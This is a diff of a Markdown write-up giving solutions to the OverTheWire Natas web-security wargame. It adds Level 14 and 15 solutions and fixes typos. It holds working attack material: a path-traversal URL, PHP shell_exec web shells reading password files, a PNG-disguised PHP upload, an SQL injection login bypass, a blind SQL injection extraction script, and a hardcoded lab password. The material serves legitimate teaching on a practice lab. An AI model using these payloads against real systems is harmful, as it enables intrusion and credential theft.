@@ -1,4 +1,5 @@
 
+
 # OverTheWire Natas Solutions
 
 This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 33 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. <br>
@@ -21,6 +22,8 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 11](#level11) 
 - [Level 12](#level12) 
 - [Level 13](#level13) 
+- [Level 14](#level14) 
+- [Level 15](#level15) 
 
 ## Level 0 <a name="level0"></a>
 Level 0 is pretty straight-foward. After logging into the level using the password `natas0`, we get the following screen:
@@ -125,12 +128,12 @@ The same page as [Level 2](#level2). Again, inspecting it gives us nothing, exce
 The phrase "Not even Google will find it this time..." may seem like a provocation, yet it reveals something interesting: the [Robots Exclusion Protocol](https://en.wikipedia.org/wiki/Robots.txt):
 > The Robots Exclusion Protocol is a standard used by websites to indicate to visiting web crawlers and other web robots which portions of the website they are allowed to visit. 
 
-That's why Google won't be able to find it... <br> Anyways, this protocol implies the existence of a `robots.txt` file somewhere in the server. In fact, we can find it immediatly in http://natas3.natas.labs.overthewire.org/robots.txt :
+That's why Google won't be able to find it... <br> Anyways, this protocol implies the existence of a `robots.txt` file somewhere in the server. In fact, we can find it immediately in http://natas3.natas.labs.overthewire.org/robots.txt :
 ```
 User-agent: *
 Disallow: /s3cr3t/
 ```
-Seems like web crawlers aren't allowed to access a hiddent path called `/s3cr3t/`. Thankfully we aren't crawlers, we're hackers, so we can visit it easily. In http://natas3.natas.labs.overthewire.org/s3cr3t we find another Apache index, displaying a `users.txt` file like before:
+Seems like web crawlers aren't allowed to access a hidden path called `/s3cr3t/`. Thankfully we aren't crawlers, we're hackers, so we can visit it easily. In http://natas3.natas.labs.overthewire.org/s3cr3t we find another Apache index, displaying a `users.txt` file like before:
 
 ![Index](/imgs/lvl3/index.png)
 
@@ -257,7 +260,7 @@ A simple link brings us to the different pages in the web app. Nothing strange, 
 
 ![Error](/imgs/lvl7/error.png)
 
-No matter what we try, we never get a valide response. But if we dig deeper, especially in the code for the page itself, we see this:
+No matter what we try, we never get a valid response. But if we dig deeper, especially in the code for the page itself, we see this:
 ```html
 <html>
     <head>
@@ -280,7 +283,7 @@ No matter what we try, we never get a valide response. But if we dig deeper, esp
 ```
 So there is a path where the password is stored[^2]. Yet how can we access it when there's no way to move around in a web server? Here comes in play the GET variable from earlier... <br>
 For those who don't use Linux, or aren't familiar to its Shell syntax, to move around folders one can use the command `cd /path_to_folder/`, and to move out, simply `cd ..` where the double dots represent the parent directory to where you are. <br>
-We can use this to out advantage to "escalate" the folder, and reach the desider path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
+We can use this to out advantage to "escalate" the folder, and reach the desired path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
 `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8` <br>
 And there, our password is shown.
 
@@ -503,7 +506,7 @@ Let's take a look at the cookie that's sent to the server:
 
 ![Cookie](/imgs/lvl11/cookie.png)
 
-Indeed, there's some [XOR cypher](https://en.wikipedia.org/wiki/XOR_cipher) on the cookie that's sent, where we could've edited some information about the `showpassword` field. By definition, a XOR cypher isn't exactly the most secure one:
+Indeed, there's some [XOR Cypher](https://en.wikipedia.org/wiki/XOR_cipher) on the cookie that's sent, where we could've edited some information about the `showpassword` field. By definition, a XOR cypher isn't exactly the most secure one:
 > The XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed. Its primary merit is that it is simple to implement, and that the XOR operation is computationally inexpensive. A simple repeating XOR (i.e. using the same key for xor operation on the whole data) cipher is therefore sometimes used for hiding information in cases where no particular security is required.
 
 Expecially when the message contains sensible information mixed in. It would be easy to reverse engineer the solution by decoding and XORing the data, but the `key` is hidden to us. We need to find what it is in order to pass the level. <br>
@@ -638,7 +641,7 @@ There are two hidden input fields, that actually display vital information we ca
 ![Hidden fields](/imgs/lvl12/hidden.png)
 While we don't care about the size, we can manipulate the files name via the input field. That's great news since that's what we wanted. Now let's change the file type to `.php` and see what the site responds once we check it out. If all went correctly, it should display the current working directory: 
 ![pwd](/imgs/lvl12/pwd.png)
-And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifing the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
+And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifying the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
 ```php
 <?php 
 	$output = shell_exec('cat ../../../../../etc/natas_webpass/natas13');  
@@ -729,9 +732,16 @@ echo '<?php $output = shell_exec("pwd"); echo $output; ?>' >> shell.png # append
 mv shell.png shell.php		# change file type
 ``` 
 
-One may ask: why all of this if we get at the end a `.php` file? Well, since we started with a `.png`, the first few bytes read by `exif_imagetype()` fool it to think it's an image, while the rest of our code is further down the file. <br>
+One may ask: why all of this if we get at the end a `.php` file? Well, since we started with a `.png`, the first few bytes read by `exif_imagetype()` fool it to think it's an image, while the rest of our code is further down the file. We can also check this by using the `file` command in Linux, which uses the same technology:
+```bash
+> file shell.php 
+shell.php: PNG image data, 9 x 5, 8-bit colormap, non-interlaced
+``` 
+<br>
 We can now upload the file (remember to change the file type in the hidden input field) and see what happens:
+
 ![pwd](/imgs/lvl13/pwd.png)
+
 Ignoring the gibberish in the top, we see our path is `/var/www/natas/natas13/upload`. Same as before, let's change the code so that we can see the password to the next challenge:
 ```bash
 # ...
@@ -744,12 +754,154 @@ Landing on the site, we see this:
 
 ![Level 14](/imgs/lvl14/screenshot.png)
 
+A simple login form which asks us for a username and password. Let's take a look at the source code:
+```php
+<?php  
+if(array_key_exists("username", $_REQUEST)) {  
+	$link = mysqli_connect('localhost', 'natas14', '<censored>');  
+	mysqli_select_db($link, 'natas14');  
+  
+	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";  
+	if(array_key_exists("debug", $_GET)) {  
+		echo "Executing query: $query<br>";  
+	}  
+  
+	if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
+		echo "Successful login! The password for natas15 is <censored><br>";  
+	} else {  
+		echo "Access denied!<br>";  
+	}  
+	mysqli_close($link);  
+} else {  
+?>  
+  
+<form action="index.php" method="POST">  
+Username: <input name="username"><br>  
+Password: <input name="password"><br>  
+<input type="submit" value="Login" />  
+</form>  
+<?php } ?>
+```
+Seems like we're working with [MySQL](https://www.mysql.com/), an open source database for storing information in tables. It would be easy for us to see the information stored, but we can't since it's hosted on the server-side. Or can we? <br>
+Working with SQL, it's impossible not to think about [SQL Injection](https://wikipedia.org/wiki/SQL_injection), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas14</h1>
+		<div id="content">
+			Successful login! The password for natas15 is ****<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
 
-[^1]: I'll be using FireFox, and DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
-[^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenge, if one doesn't want to use hints.
-[^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose).
-\- `>>` redirect stdout to file.
+## Level 15 <a name="level15"></a>
+Landing on the site, we see this:
+
+![Level 15](/imgs/lvl15/screenshot.png)
+
+Now things get complicated. We need a way to retrieve the password only from asking basic information to the SQL database:
+```php
+``<?php  
+  
+/*  
+CREATE TABLE `users` (  
+`username` varchar(64) DEFAULT NULL,  
+`password` varchar(64) DEFAULT NULL  
+);  
+*/  
+  
+if(array_key_exists("username", $_REQUEST)) {  
+	$link = mysqli_connect('localhost', 'natas15', '<censored>');  
+	mysqli_select_db($link, 'natas15');  
+  
+	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
+	if(array_key_exists("debug", $_GET)) {  
+		echo "Executing query: $query<br>";  
+	}  
+  
+	$res = mysqli_query($link, $query);  
+	if($res) {  
+		if(mysqli_num_rows($res) > 0) {  
+			echo "This user exists.<br>";  
+		} else {  
+			echo "This user doesn't exist.<br>";  
+		}  
+	} else {  
+		echo "Error in query.<br>";  
+	}  
+  
+	mysqli_close($link);  
+} else {  
+?>  
+  
+<form action="index.php" method="POST">  
+Username: <input name="username"><br>  
+<input type="submit" value="Check existence" />  
+</form>  
+<?php } ?>``
+```
+Whenever we send a username, the code checks for its existence in the table `users` (which structure is kindly provided to us). The hard part is guessing which user has the password we need, and how to get it. <br>
+This is an example of [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind), where:
+> Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+
+Simply testing which possible name we have for the next challenge is easy: `natas16` is a valid username. Now we need to extract information of the password. Let's use the input field to search for a possible password, and let's break down what's happening:
+```sql
+natas16" AND substring(password,1,2) = 'a' -- 
+
+```
+It simply means _search for the username "natas16" and that it has for password as first character "a"_ where [substring()](https://www.php.net/manual/en/function.substr.php?ref=learnhacking.io) will help us crack the password character per character.
+<br>
+Now, we could brute force the password doing by hand, but knowing it's 32 characters long, it takes quite a while. Let's write a script that'll automatically do it for us:
+`blind-sql.py`
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+url = "http://natas15.natas.labs.overthewire.org/"
+
+# Password generator
+count = 1
+password = ""
+max_lenght = 32
+valid_characters = string.digits + string.ascii_letters
+
+# While we haven't found the password...
+while count <= max_lenght:
+    # ... for each valid character (numbers, lowercase and uppercase)
+    for c in valid_characters:
+        # Our payload
+        payload = "natas16\" AND substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
+        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
+        # We got a hit
+        if "This user exists." in response.text:
+            print("Found: " + password + c)
+            password += c
+            count += 1
+
+print("Final password: " + password)
+```
+After waiting, the password will be printed out fully.
+
+## Level 16 <a name="level16"></a>
+Landing on the site, we see this:
+
+![Level 16](/imgs/lvl16/screenshot.png)
+
+
+[^1]: I'll be using FireFox, so DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
+[^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenges, if one doesn't want to use hints.
+[^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
+\- `>>` redirect stdout to file. <br>
 \- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for some of the commands and explanations.
+
 
 
 
